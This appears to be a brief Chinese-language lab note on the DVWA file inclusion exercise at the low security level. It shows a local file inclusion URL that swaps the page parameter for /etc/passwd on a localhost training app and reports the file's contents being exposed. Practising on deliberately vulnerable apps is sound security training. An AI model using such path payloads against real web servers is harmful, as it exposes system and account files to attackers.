# File Inclusion

## Low 

原本的路徑：
```
    http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php
```
打了passwd 可以看到整個passwd
```
    http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/etc/passwd
```